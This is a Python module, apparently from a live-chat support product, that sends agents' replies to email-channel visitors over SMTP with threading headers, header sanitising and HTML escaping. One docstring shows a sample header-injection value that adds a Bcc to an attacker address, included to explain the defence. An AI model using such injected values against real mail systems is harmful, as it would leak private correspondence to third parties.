"""Outbound SMTP for email-channel chats.

When an agent replies to a chat where `room.channel == 'email'`, we ship
that reply via the mailbox's SMTP credentials instead of broadcasting
over the chat WebSocket. Threading headers are set so the visitor's mail
client groups replies under the original conversation.
"""
from __future__ import annotations

import email.utils
import html as _html
import logging
import re
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from typing import Optional

logger = logging.getLogger(__name__)

_HEADER_INJECTION_RE = re.compile(r'[\r\n\0]')


def _sanitize_header(value: str, max_len: int = 200) -> str:
    """Strip CR/LF/NUL from a value that's about to land in an SMTP header.
    Without this, `from_name = "Bob\\r\\nBcc: attacker@evil.com"` injects a
    BCC into every outbound reply — a Section 5.4 SMTP injection."""
    if not value:
        return ''
    return _HEADER_INJECTION_RE.sub(' ', str(value))[:max_len].strip()


def _pick_mailbox(room):
    """Find the EmailMailbox to use for an outbound reply.

    Priority:
        1. A mailbox pinned to the room's website
        2. Any mailbox in the room's org
    """
    from tracker.chat.models import EmailMailbox
    org = room.organization
    if not org:
        return None
    if room.website_id:
        mb = EmailMailbox.objects.filter(
            organization=org, website_id=room.website_id, is_enabled=True
        ).first()
        if mb:
            return mb
    return EmailMailbox.objects.filter(organization=org, is_enabled=True).first()


def send_email_reply(room, body_text: str, agent_name: str = '') -> bool:
    """Send `body_text` to the visitor's email as a reply in the existing
    email thread. Returns True on success."""
    if not room or not room.visitor_email:
        return False
    mb = _pick_mailbox(room)
    if not mb:
        logger.warning('email reply: no mailbox configured for org=%s', getattr(room.organization, 'id', None))
        return False

    # Sanitize anything that lands in an SMTP header — subject, display name,
    # visitor email — so a stray CR/LF can't sneak in a Bcc or Reply-To.
    subject_raw = room.subject or 'Re: your message'
    subject = _sanitize_header(subject_raw, max_len=200)
    if not subject.lower().startswith('re:'):
        subject = f'Re: {subject}'

    display_name = _sanitize_header(mb.from_name or agent_name or mb.from_email, max_len=100)
    safe_from_email = _sanitize_header(mb.from_email, max_len=200)
    safe_to_email = _sanitize_header(room.visitor_email, max_len=200)
    # email.utils.formataddr quotes special chars in display names properly —
    # use it instead of f-string concatenation.
    from_display = email.utils.formataddr((display_name, safe_from_email))

    msg = MIMEMultipart('alternative')
    msg['From'] = from_display
    msg['To'] = safe_to_email
    msg['Subject'] = subject
    # Use the real mailbox's domain for Message-ID and references — the
    # earlier synthetic 'livetrack.local' broke threading in Gmail/Outlook
    # because mail clients verify the referenced Message-IDs share a domain.
    from_domain = safe_from_email.split('@', 1)[-1] if '@' in safe_from_email else 'livevisitorhub.com'
    msg['Message-ID'] = email.utils.make_msgid(domain=from_domain)
    if room.external_thread_id:
        thread_ref = f'<{_sanitize_header(room.external_thread_id, 64)}@{from_domain}>'
        msg['References'] = thread_ref
        msg['In-Reply-To'] = thread_ref

    body_text = body_text or ''
    # Plain text first (most compatible), then a soft HTML version.
    msg.attach(MIMEText(body_text, 'plain', 'utf-8'))
    # Escape body before inlining into HTML — without this, anything that
    # looks like a tag in the agent's reply (or a compromised draft) would
    # render as live HTML on the visitor's mail client.
    escaped = _html.escape(body_text).replace('\n', '<br>')
    html_body = (
        '<div style="font-family:Arial,sans-serif;font-size:14px;line-height:1.6;color:#1f2937;">'
        + escaped + '</div>'
    )
    msg.attach(MIMEText(html_body, 'html', 'utf-8'))

    try:
        if mb.smtp_use_tls:
            s = smtplib.SMTP(mb.smtp_host, mb.smtp_port, timeout=15)
            s.ehlo()
            s.starttls()
            s.ehlo()
        else:
            s = smtplib.SMTP_SSL(mb.smtp_host, mb.smtp_port, timeout=15)
        if mb.smtp_username:
            s.login(mb.smtp_username, mb.smtp_password_plain)
        s.send_message(msg)
        s.quit()
        return True
    except Exception:
        logger.warning('SMTP send failed for room=%s', room.room_id, exc_info=True)
        return False
